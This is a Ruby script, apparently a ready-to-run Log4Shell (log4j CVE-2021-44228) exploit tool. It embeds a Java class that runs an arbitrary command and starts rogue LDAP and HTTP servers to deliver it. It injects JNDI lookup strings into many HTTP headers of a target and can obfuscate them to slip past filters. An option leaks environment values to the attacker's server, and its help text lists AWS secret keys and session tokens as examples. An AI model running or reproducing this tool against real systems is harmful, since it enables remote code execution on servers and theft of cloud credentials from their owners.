#!/usr/bin/env ruby
# Author: Jason Villaluna

require 'optparse'
require 'net/http'
require 'webrick'
require 'socket'
require 'logger'

class HTTPServer < WEBrick::HTTPServlet::AbstractServlet
  # from:https://github.com/alexandre-lavoie/python-log4rce
  JAVA_CLASS = "\xca\xfe\xba\xbe\x00\x00\x003\x00\x1d\n\x00\x02\x00\x03\x07\x00\x04\x0c\x00\x05\x00\x06\x01\x00\x10java/lang/Object\x01\x00\x06<init>\x01\x00\x03()V\n\x00\x08\x00\t\x07\x00\n\x0c\x00\x0b\x00\x0c\x01\x00\x11java/lang/Runtime\x01\x00\ngetRuntime\x01\x00\x15()Ljava/lang/Runtime;\x08\x00\x0e\x01\x00\x01#\n\x00\x08\x00\x10\x0c\x00\x11\x00\x12\x01\x00\x04exec\x01\x00'(Ljava/lang/String;)Ljava/lang/Process;\x07\x00\x14\x01\x00\x13java/lang/Exception\x07\x00\x16\x01\x00\x07Exploit\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x08<clinit>\x01\x00\rStackMapTable\x01\x00\nSourceFile\x01\x00\x0cExploit.java\x00!\x00\x15\x00\x02\x00\x00\x00\x00\x00\x02\x00\x01\x00\x05\x00\x06\x00\x01\x00\x17\x00\x00\x00\x1d\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x01\xb1\x00\x00\x00\x01\x00\x18\x00\x00\x00\x06\x00\x01\x00\x00\x00\x01\x00\x08\x00\x19\x00\x06\x00\x01\x00\x17\x00\x00\x00C\x00\x02\x00\x01\x00\x00\x00\x0e\xb8\x00\x07\x12\r\xb6\x00\x0fW\xa7\x00\x04K\xb1\x00\x01\x00\x00\x00\t\x00\x0c\x00\x13\x00\x02\x00\x18\x00\x00\x00\x0e\x00\x03\x00\x00\x00\x04\x00\t\x00\x05\x00\r\x00\x06\x00\x1a\x00\x00\x00\x07\x00\x02L\x07\x00\x13\x00\x00\x01\x00\x1b\x00\x00\x00\x02\x00\x1c".freeze

  def initialize(server, command, random_str)
    super(server)
    @content = generate_payload(command, random_str)
    @request_path = "/#{random_str}.class"
  end

  def build_response(response, status, content_type, body)
    response.status = status
    response['Content-Type'] = content_type
    response.body = body
  end

  def handle_request(request, response, body)
    build_response(response, 200, 'application/octet-stream', body)
  end

  def not_found_request(request, response)
    build_response(response, 404, 'text/plain', "Not Found\n")
  end

  def do_GET(request, response)
    if request.path == @request_path
      handle_request(request, response, @content)
    else
      not_found_request(request, response)
    end
  end

  def generate_payload(command, random_str)
    payload = JAVA_CLASS.sub('#', command).gsub('Exploit', random_str)
    payload[132] = [command.size].pack('C*').force_encoding('utf-8')
    payload
  end

  def self.serve(command, random_str, port)
    Notlog4j.info('Starting HTTP Server')
    access_log = StringIO.new
    server = WEBrick::HTTPServer.new(
      BindAddress: '0.0.0.0',
      Port: port,
      AccessLog: [
        [$stderr, " #{'-' * 33} HTTPServer: #{WEBrick::AccessLog::COMBINED_LOG_FORMAT}"],
        [access_log, WEBrick::AccessLog::COMBINED_LOG_FORMAT]
      ],
      Logger: WEBrick::Log.new(File.open(File::NULL, 'w'))
    )
    server.mount('/', HTTPServer, command, random_str)
    [Thread.new {server.start}, access_log]
  rescue Errno::EADDRINUSE
    Notlog4j.debug("\e[31mPort #{port} is already in used. Please use another port\e[0m")
    exit(1)
  end
end

class LDAPServer
  # from:https://github.com/alexandre-lavoie/python-log4rce
  LDAP_RESPONSE = "0\x81\x83\x02\x01\x02d\x81}\x04\x07Exploit0\x81\x820\x1a\x04\rjavaClassName1\t\x04\x07Exploit0\x13\x04\x0cjavaCodeBase1\x03\x04\x01#0$\x04\x0bobjectClass1\x15\x04\x13javaNamingReference0\x18\x04\x0bjavaFactory1\t\x04\x07Exploit0\x0c\x02\x01\x02e\x07\n\x01\x00\x04\x00\x04\x00".freeze
  LDAP_PA       = "0\x0c\x02\x01\x01a\x07\n\x01\x00\x04\x00\x04\x00".freeze

  def initialize(port, http_server, random_str)
    @port = port
    @http_server = http_server
    @random_str = random_str
  end

  def calc_size(str, const)
    [str.size + const].pack('C*').force_encoding('utf-8')
  end

  def generate_response
    response = LDAP_RESPONSE.sub('#', @http_server).gsub('Exploit', @random_str)
    { 68 => 0, 66 => 2, 50 => 18, 8 => 124, 2 => 130 }.each do |index, const|
      response[index] = calc_size(@http_server, const)
    end

    response
  end

  def get_info(response)
    index = response.rindex("\x04") + 1
    response[index..-1].bytes.select { |b| b > 32 }.pack('C*')
  end

  def self.serve(port, http_server, random_str, info_extract)
    Notlog4j.info('Starting LDAP Server')
    connect_back = StringIO.new
    ldap_server = LDAPServer.new(port, http_server, random_str)
    [
      Thread.new do
        server = TCPServer.new(port)
        loop do
          client = server.accept
          client.puts(LDAP_PA)
          connect_back << client.gets
          Notlog4j.info('Received LDAP Request back')
          if info_extract
            Notlog4j.info(
              "Information received: \e[32m#{ldap_server.get_info(connect_back.string)}\e[0m"
            )
          end
          Notlog4j.info('Sending LDAP Response for HTTP callback')
          client.puts(ldap_server.generate_response)
          client.close
        end
      rescue Errno::EADDRINUSE
        Notlog4j.debug("\e[31mPort #{port} is already in used. Please use another port\e[0m")
        exit(1)
      end,
    connect_back
    ]
  end
end

class Log4JExploit
  def initialize(args)
    @target = args[:target]
    @attacker_ip = args[:attacker_ip]
    @ldap_port = args[:ldap_port]
    @http_port = args[:http_port]
    @command = args[:command]
    @obfuscate = args[:obfuscate]
    @info_extract = args[:info_extract]
    @jndi_payload = jndi_ldap_payload
  end

  def run!
    http_server, ldap_server = serve
    send_http_request
    sleep(5) if @access_log.string.empty?
  ensure
    http_server&.kill
    ldap_server&.kill
    exit(0)
  end

  def serve_only!
    http_server, ldap_server = serve
    Notlog4j.info("Use payload: \e[32m#{@jndi_payload}\e[0m")
    Signal.trap('INT') do
      puts "\nShutting down the servers"
      http_server&.kill
      ldap_server&.kill
      exit(0)
    end
    sleep
  end

  def serve
    obfuscate if @obfuscate
    random_str = (0..6).map { rand(65..91).chr }.join
    exploit_url = "http://#{@attacker_ip}:#{@http_port}/"
    http_server, @access_log = HTTPServer.serve(@command, random_str, @http_port)
    ldap_server, @connect_back = LDAPServer.serve(@ldap_port, exploit_url, random_str, @info_extract)
    [http_server, ldap_server]
  end

  def jndi_ldap_payload
    "${jndi:ldap://#{@attacker_ip}:#{@ldap_port}#{"/${#{@info_extract}}" unless @info_extract.nil?}}"
  end

  # from: https://github.com/rapid7/metasploit-framework/blob/ddc940765788fff9fdfcbf53dc6a355225202a77/data/exploits/CVE-2021-44228/http_headers.txt
  def headers
    %w[
      Authorization
      Cache-Control
      Cf-Connecting_ip
      Client-Ip
      Contact
      Cookie
      Forwarded-For-Ip
      Forwarded-For
      Forwarded
      If-Modified-Since
      Originating-Ip
      Referer
      True-Client-Ip
      User-Agent
      X-Api-Version
      X-Client-Ip
      X-Forwarded-For
      X-Leakix
      X-Originating-Ip
      X-Real-Ip
      X-Remote-Addr
      X-Remote-Ip
      X-Wap-Profile
    ]
  end

  def obfuscate
    jndi_payload = @jndi_payload[2..-2].chars.map { |c| "${lower:#{c}}" }.join
    @jndi_payload[2..-2] = jndi_payload
  end

  def send_request(uri, header)
    http = Net::HTTP.new(uri.hostname, uri.port)
    http.read_timeout = 5
    http.open_timeout = 5
    if uri.scheme == 'https'
      http.use_ssl = true
      http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    end

    request_uri = header.empty? ? uri + "?z=#{@jndi_payload}" : uri
    request = http.request(Net::HTTP::Get.new(request_uri, header))
  end

  def send_http_request
    uri = URI.parse(@target)
    headers.push('').shuffle.each do |header_key|
      header = { header_key => @jndi_payload }
      send_request(uri, header)
      break unless @connect_back.string.empty?
    end
    Notlog4j.info("\e[32m#{@target} is using vulnerable log4j library\e[0m")
  rescue StandardError => e
    Notlog4j.debug("\e[31mError #{e.inspect} encountered when sending HTTP request to #{@target}\e[0m")
    exit(1)
  end
end

def parse_args
  args = {
    target: 'http://127.0.0.1:8080',
    attacker_ip: '0.0.0.0',
    ldap_port: 53,
    http_port: 1010,
    command: 'touch /dev/shm/log4j_vulnerable',
    serve_only: false,
    info_extract: nil,
    obfuscate: false
  }
  parser = OptionParser.new do |opts|
    opts.banner = "Usage: #{$PROGRAM_NAME} -t [Target] -a [Attacker IP] -l [LDAP Port] -h [HTTP Port]"
    opts.separator ''
    opts.separator 'Options:'

    opts.on('--target', '-t Target', 'Target Host to check. Default: http://127.0.0.1:8080') do |value|
      args[:target] = value
    end

    opts.on('--attacker', '-a Attacker', 'IP of LDAP and HTTP servers. Default: 0.0.0.0') do |value|
      args[:attacker_ip] = value
    end

    opts.on('--ldap', '-l LDAP_PORT', 'LDAP Port to use. Default: 53') do |value|
      args[:ldap_port] = value.to_i
    end

    opts.on('--http', '-h HTTP_PORT', 'HTTP Port to use. Default: 1010') do |value|
      args[:http_port] = value.to_i
    end

    opts.on('--command', '-c Command', 'Command to execute. Default: "touch /dev/shm/log4j_vulnerable"') do |value|
      args[:command] = value
    end

    opts.on('--serve_only', '-s', '[OPTIONAL] Starts HTTP and LDAP Server, then send JNDI payload manually') do
      args[:serve_only] = true
    end

    # from: https://twitter.com/therceman/status/1470768985302048774/photo/1
    opts.on(
      '--info_extract',
      '-i Info_key',
      '[OPTIONAL] Extracts information from the target using log4j keywords. Default is none.'\
      " Possible inputs but not limited to below:\n"\
      "\t\t\t\t\thostName\n"\
      "\t\t\t\t\tsys:user.name\n"\
      "\t\t\t\t\tsys:user.home\n"\
      "\t\t\t\t\tsys:user.dir\n"\
      "\t\t\t\t\tsys:java.home\n"\
      "\t\t\t\t\tsys:java.vendor\n"\
      "\t\t\t\t\tsys:java.version\n"\
      "\t\t\t\t\tsys:java.vendor.url\n"\
      "\t\t\t\t\tsys:java.vm.version\n"\
      "\t\t\t\t\tsys:java.vm.vendor\n"\
      "\t\t\t\t\tsys:java.vm.name\n"\
      "\t\t\t\t\tsys:os.name\n"\
      "\t\t\t\t\tsys:os.arch\n"\
      "\t\t\t\t\tsys:os.version\n"\
      "\t\t\t\t\tenv:JAVA_VERSION\n"\
      "\t\t\t\t\tenv:AWS_SECRET_ACCESS_KEY\n"\
      "\t\t\t\t\tenv:AWS_SESSION_TOKEN\n"\
      "\t\t\t\t\tenv:AWS_SHARED_CREDENTIALS_FILE\n"\
      "\t\t\t\t\tenv:AWS_WEB_IDENTITY_TOKEN_FILE\n"\
      "\t\t\t\t\tenv:AWS_PROFILE\n"\
      "\t\t\t\t\tenv:AWS_CONFIG_FILE\n"\
      "\t\t\t\t\tenv:AWS_ACCESS_KEY_ID"
    ) do |value|
      args[:info_extract] = value
    end

    opts.on('--obfuscate', '-o', '[OPTIONAL] Obfuscates the JNDI Payload') do
      args[:obfuscate] = true
    end

    opts.on_tail('--help', 'Print options') do
      warn opts
      exit(0)
    end
  end
  parser.parse!
  args
rescue OptionParser::MissingArgument
  parser.parse %w[--help]
  retry
end

if __FILE__ == $PROGRAM_NAME
  begin
    args = parse_args
    Notlog4j = ::Logger.new($stdout)
    log4j_exploit = Log4JExploit.new(args)
    log4j_exploit.run! unless args[:serve_only]
    log4j_exploit.serve_only!
  rescue StandardError => e
    Notlog4j.debug("\e[31m[-]\e[0m Encountered: \e[31m'#{e.class}'\n#{e.backtrace.join("\n")}\e[0m")
    exit(1)
  end
end
